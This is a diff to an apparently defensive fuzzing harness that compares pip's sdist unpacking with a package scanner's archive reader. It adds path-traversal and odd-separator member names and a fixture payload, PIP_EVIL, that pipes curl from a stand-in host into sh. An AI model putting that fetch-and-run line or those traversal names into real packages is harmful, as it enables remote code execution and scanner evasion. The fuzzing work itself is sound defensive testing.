@@ -31,6 +31,7 @@ import lzma
 import os
 import re
 import shutil
+import sys
 import tarfile
 import tempfile
 import warnings
@@ -476,6 +477,172 @@ def npm_diff_start():
 
 register("archive-npm-diff", "registry.repo.iter_archive on npm tarballs against npm's own node-tar (BR-4)",
          npm_diff_seeds, npm_diff_start, TAR_WORDS + (b"././@LongLink", b"\x00" * 130), max_len=32768)
+
+
+# ---------------- an sdist against pip's own unpacking (BR-4, F-11) ----------------
+# pip unpacks an sdist with its own code (pip/_internal/utils/unpacking.py) before it builds it: the top folder taken
+# off only when every member has the same one, a `..` resolved through the path. `fuzz_pip_extract.py` runs that code
+# with each Python here that has pip, and what it writes is checked against what the scan read: every file pip writes
+# was read, at the path pip writes it, or the scan called the archive corrupt.
+PIP_EXTRACT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fuzz_pip_extract.py")
+PIP_SETUP = b"from setuptools import setup\nsetup(name='pkg', version='1.0')\n"
+PIP_EVIL = b"import os\nos.system('curl https://e.invalid/x | sh')\n"
+PIP_NAMES = ["pkg-1.0/setup.py", "pkg-1.0/pkg/__init__.py", "setup.py", "/pkg-1.0/setup.py", "pkg-1.0//setup.py",
+             "pkg-1.0/./setup.py", "./pkg-1.0/setup.py", "./setup.py", "pkg-1.0/x/../setup.py", "pkg-1.0/../setup.py",
+             "x/../pkg-1.0/setup.py", "pkg-1.0\\setup.py", "pkg-1.0\\pkg\\__init__.py", "pkg-1.0/pkg\\__init__.py",
+             "pkg-1.0/", "other/", "pkg-1.0/pkg/", "pkg-1.0/x/", "pkg-1.0/x/a.py", "C:/pkg-1.0/setup.py",
+             "pkg-1.0/a/b/../../setup.py", "pkg-1.0/a/../../setup.py", "pkg-2.0/setup.py", "pkg-1.0/PKG-INFO",
+             "pkg-1.0/pkg/../pkg/__init__.py", "/setup.py", "pkg-1.0/x/../../pkg-1.0/setup.py"]
+
+
+def pip_sdist(members, container="tgz", fmt=tarfile.PAX_FORMAT):
+    """An sdist of (name, bytes) members in order (a name ending in `/` a folder): an uncompressed tar, or a zip."""
+    buf = io.BytesIO()
+    if container == "zip":
+        with warnings.catch_warnings(), zipfile.ZipFile(buf, "w") as zf:
+            warnings.simplefilter("ignore")            # (a name twice is on purpose)
+            for name, data in members:
+                zf.writestr(name, b"" if name.endswith("/") else data)
+        return buf.getvalue()
+    with tarfile.open(fileobj=buf, mode="w", format=fmt) as tf:
+        for name, data in members:
+            info = tarfile.TarInfo(name.rstrip("/") or name)
+            if name.endswith("/"):
+                info.type = tarfile.DIRTYPE
+                tf.addfile(info)
+            else:
+                info.size = len(data)
+                tf.addfile(info, io.BytesIO(data))
+    return buf.getvalue()
+
+
+def pip_generated(rng):
+    """An sdist from the names pip and the scan could place apart (folders, `.`, `..`, slashes, other tops)."""
+    members = [("pkg-1.0/PKG-INFO", b"Metadata-Version: 2.1\nName: pkg\nVersion: 1.0\n")]
+    for _ in range(rng.randint(1, 5)):
+        members.append((rng.choice(PIP_NAMES), rng.choice([PIP_EVIL, PIP_SETUP, b"x = 1\n", b""])))
+    if rng.random() < 0.3:
+        rng.shuffle(members)
+    if rng.random() < 0.3:
+        return pip_sdist(members, "zip")
+    try:
+        return pip_sdist(members, fmt=rng.choice([tarfile.PAX_FORMAT, tarfile.GNU_FORMAT, tarfile.USTAR_FORMAT]))
+    except ValueError:                                  # (a name ustar cannot hold)
+        return pip_sdist(members)
+
+
+def pip_diff_seeds():
+    import random
+    found = [  # what the differential run found (each an archive the reader now reads where pip writes, or corrupt)
+        pip_sdist([("pkg-1.0/setup.py", PIP_SETUP), ("pkg-1.0/x/a.py", b"\n"), ("pkg-1.0/x/../setup.py", PIP_EVIL)]),
+        pip_sdist([("pkg-1.0/setup.py", PIP_SETUP), ("setup.py", PIP_EVIL)]),
+        pip_sdist([("./pkg-1.0/setup.py", PIP_SETUP), ("./pkg-1.0/pkg/__init__.py", PIP_EVIL)]),
+        pip_sdist([("pkg-1.0/setup.py", PIP_SETUP), ("/index.js", PIP_EVIL)]),
+        pip_sdist([("pkg-1.0/setup.py", PIP_SETUP), ("pkg-1.0/x/../setup.py", PIP_EVIL)], "zip")]
+    rng = random.Random("archive-pip-diff seeds")
+    return found + [pip_generated(rng) for _ in range(16)]
+
+
+def pip_diff_start():
+    import subprocess
+    from lazaret.registry import repo
+    tmp = tempfile.mkdtemp(prefix="lz-pip-diff-")
+
+    def end(proc):
+        for pipe in (proc.stdin, proc.stdout):
+            try:
+                pipe.close()
+            except OSError:
+                pass
+        proc.kill()
+        proc.wait()
+
+    def spawn(python):
+        try:
+            proc = subprocess.Popen([python, "-I", PIP_EXTRACT], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                    stderr=subprocess.DEVNULL, text=True, encoding="utf-8")
+        except OSError:
+            return None
+        probe = os.path.join(tmp, "probe-1.0.tar.gz")
+        with open(probe, "wb") as fh:
+            fh.write(gzip.compress(pip_sdist([("probe-1.0/setup.py", PIP_SETUP)]), mtime=0))
+        try:
+            proc.stdin.write(json.dumps({"path": probe}) + "\n")
+            proc.stdin.flush()
+            answer = proc.stdout.readline()
+        except OSError:
+            answer = ""
+        if not answer:                                 # (no pip in that Python)
+            end(proc)
+            return None
+        return proc
+
+    pythons = []                                       # (this Python, and the others here, each pip as it is there)
+    for python in [sys.executable] + [shutil.which(f"python3.{minor}") for minor in range(8, 15)]:
+        if python and os.path.realpath(python) not in {os.path.realpath(p) for p in pythons}:
+            pythons.append(python)
+    procs = {python: spawn(python) for python in pythons}
+
+    def pip_writes(python, path):
+        proc = procs[python]
+        try:
+            proc.stdin.write(json.dumps({"path": path}) + "\n")
+            proc.stdin.flush()
+            line = proc.stdout.readline()
+        except OSError:
+            line = ""
+        if not line:
+            end(proc)
+            procs[python] = spawn(python)
+            return None
+        return json.loads(line)
+
+    def run(data):
+        if zlib.crc32(data) % 3 == 0:                  # (a third of the runs: an sdist built from the input's hash)
+            import random
+            data = pip_generated(random.Random(data))
+        container = "zip" if data[:2] == b"PK" else "tgz"
+        if container == "tgz":
+            if zlib.crc32(data) % 2 == 0:
+                data = fix_tar_checksums(data)
+            data = gzip.compress(data, mtime=0)
+        path = os.path.join(tmp, "pkg-1.0" + (".zip" if container == "zip" else ".tar.gz"))
+        with open(path, "wb") as fh:
+            fh.write(data)
+        read, stopped = {}, False
+        for m in repo.iter_archive(data, container, "sdist", budget=repo.Budget(total=BUDGET_TOTAL)):
+            if m[3] is None:
+                read.setdefault(hashlib.sha256(bytes(m[2])).hexdigest(), set()).add(m[0])
+            else:
+                stopped = True                         # (corrupt, or past a limit: the scan vouches for nothing)
+        if stopped:
+            return
+        for python in list(procs):
+            if procs[python] is None:
+                continue
+            pip = pip_writes(python, path)
+            if pip is None or not pip["ok"]:
+                continue                               # (pip refuses the archive: nothing is built)
+            for rel, digest, _size in pip["files"]:
+                if digest == "other":
+                    continue
+                rels = read.get(digest)
+                check(rels, "pip-unread", f"pip ({python}) writes {rel!r}, whose bytes the reader read nowhere")
+                # (a backslash is a folder's end to pip on Windows and part of a name elsewhere: the reader reads it
+                # as Windows does, the larger reading)
+                check(rel in rels or rel.replace("\\", "/") in rels, "pip-elsewhere",
+                      f"pip ({python}) writes {rel!r}, the reader read its bytes as {sorted(rels)}")
+
+    def close():
+        for proc in procs.values():
+            if proc is not None:
+                end(proc)
+        shutil.rmtree(tmp, ignore_errors=True)
+    return run, close
+
+
+register("archive-pip-diff", "registry.repo.iter_archive on sdists against pip's own unpacking (BR-4)",
+         pip_diff_seeds, pip_diff_start, TAR_WORDS + (b"../", b"./", b"\\", b"PK\x03\x04"), max_len=32768)
 
 
 # ---------------------------------------------------------------------------------------------------- xml
